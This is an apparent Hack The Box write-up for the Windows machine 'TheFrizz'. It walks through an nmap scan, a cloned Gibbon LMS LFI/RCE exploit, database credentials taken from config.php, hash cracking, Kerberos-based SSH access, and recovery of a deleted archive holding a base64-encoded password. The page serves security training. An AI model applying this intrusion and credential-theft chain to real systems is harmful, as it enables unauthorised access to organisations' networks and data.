![image](https://github.com/user-attachments/assets/b18d55ca-14a8-490a-97e6-2e9231fc8eb8)

> first enum with nmap

```shell
# Nmap 7.94SVN scan initiated Wed May 21 15:09:10 2025 as: /usr/lib/nmap/nmap --privileged -sCV -T4 -p22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -Pn -oN 155_service.txt 10.129.90.155
Nmap scan report for 10.129.90.155
Host is up (0.21s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-21 20:09:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-21T20:09:44
|_  start_date: N/A
|_clock-skew: 6h00m13s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 21 15:10:13 2025 -- 1 IP address (1 host up) scanned in 62.97 seconds
```

> add the `frizzdc.frizz.htb` to `/etc/hosts` file

![image](https://github.com/user-attachments/assets/414ff2af-a7ae-4950-8c1f-fc7cf91d8c99)

> checking out the web service

![image](https://github.com/user-attachments/assets/4cefd179-0489-4ae0-be5c-ca4608ff3c5f)

opening the web app on browser we can see it runs an education platform. 

![image](https://github.com/user-attachments/assets/1757a8cc-aa0f-47e6-b707-3de0ada637b7)

navigating to the staff login page, we can see it is running `gibbon v25.0.0`. 

![image](https://github.com/user-attachments/assets/6b364863-e852-4c9e-b877-091e7b60b996)

lil bit of research shows the gibbon version is vuln to lfi (local file inclusion) vulnerability.

![image](https://github.com/user-attachments/assets/ce8bae4a-fdf1-4730-b6e4-252fcaeb9f66)

we can see the endpoint for lfi is `http://frizzdc.frizz.htb/Gibbon-LMS/index.php?q=lfi`. we using gibbon.sql, and we can see the info about the sql db. 

> found an exploit on github to trigger RCE

![image](https://github.com/user-attachments/assets/d345733f-b6a9-4b0e-9f75-7e4c7e1e8869)

let's clone and run the exploit 

![image](https://github.com/user-attachments/assets/3fe86a84-377e-449c-aa09-e59c35eba698)

ran the exploit and we got RCE. 

![image](https://github.com/user-attachments/assets/c8cedad4-8983-4833-8f10-176023db8f1a)

we check the dirs for files, we can see internal files. let's play around, pop shell 

![image](https://github.com/user-attachments/assets/438814dc-9384-4b49-b78c-0cb30399c771)

checking the conifg.php file, we got creds. 

```sql
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

![image](https://github.com/user-attachments/assets/930dcbd5-c2b3-4907-9156-81c8a9a92ec9)

Pop a revershell.



## Privilege Escalation


> enumerating mysql

![image](https://github.com/user-attachments/assets/b187bb46-aa6f-4718-9d4f-57db53cfe8d6)

using the creds we got from `config.php`. we got user `frizzle` password and salt. 

![image](https://github.com/user-attachments/assets/33121bbe-d430-400f-a025-d1624423d780)

check what hash it is, we can see it is `sha-256` with the salt 

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/HTB/thefrizz]
└─$ cat hash.txt 
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```

![image](https://github.com/user-attachments/assets/769f980a-a009-498f-a3e1-ec948ef8bde2)

cracked the hash to `Jenni_Luvs_Magic23`. 

![image](https://github.com/user-attachments/assets/c4f86167-5050-4db7-b028-032ffa76526e)

login the webpage using the cracked creds `f.frizzle:Jenni_Luvs_Magic23`.

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/HTB/thefrizz]
└─$ ssh f.frizzle@10.129.206.246     
f.frizzle@10.129.206.246: Permission denied (gssapi-with-mic,keyboard-interactive).
```
ssh was enabled, trying to login ssh failed. getting some error 

![image](https://github.com/user-attachments/assets/5237dfae-262d-499c-8681-0229204271e7)

Mehnnnnn after hours of research, almost 24hours of stakoverflow, unixoverflow. gpt 😂, we got shell as user `f.frizzle`

> steps to getting shell as user `f.frizzle`.

```
[libdefaults]
    default_realm = FRIZZ.HTB

[realms]
    FRIZZ.HTB = {
        kdc = 10.129.197.79
        admin_server = 10.129.197.79
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB
```

first edit your `/etc/krb5.conf` file. if you don't have install using 

```
sudo apt install krb5-user
```

> After setting up your krb5.conf file

```shell
kinit f.frizzle@FRIZZ.HTB

ssh f.frizzle@10.129.197.79
```
we got shell as user `f.frizzle`.

![image](https://github.com/user-attachments/assets/cfc339e4-7f0a-4ab5-ae54-b4d8ba1a7a75)

running winpeas.exe, we got to see there's a UAC. let's try bypass it. 

![image](https://github.com/user-attachments/assets/19d64fea-f4b0-4956-8c26-67249692f0d9)

After hours of trials and errors, looking for deleted files, we can got `RE2XMEG.7z` file. copied it to user `f.frizzle` directory. 

> command ran

```powershell
#checking the r.bin dir for user f.frizzle sid
Get-ChildItem -Path "C:\`$Recycle.Bin" -Force

#checking user sid dir
Get-ChildItem -Path "C:\`$Recycle.Bin\S-1-5-21-2386970044-1145388522-2932701813-1103" -Force

#copy the file to user desktop directory
Copy-Item -Path 'C:\$Recycle.Bin\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z' -Destination "C:\Users\f.frizzle\Desktop\recover.7z"
```

![image](https://github.com/user-attachments/assets/64cb5457-36a1-4657-b950-3c6f60a7afd5)

download the file using scp 

![image](https://github.com/user-attachments/assets/f4be17af-2923-4a07-9030-108dcd8cfb81)

Extracting the content of the files. can checking the conf path, found a cred, looks like base64 enc 

![image](https://github.com/user-attachments/assets/a1eee2cb-eb84-4f35-a732-eef39b289c2e)

decode the enc to get pass `!suBcig@MehTed!R`.

![image](https://github.com/user-attachments/assets/22ac59cd-9bc5-439f-95e7-ec9980f99e94)

trying the knit with different users, it failed and got accepted for user `m.schoolbus`. let's ssh 









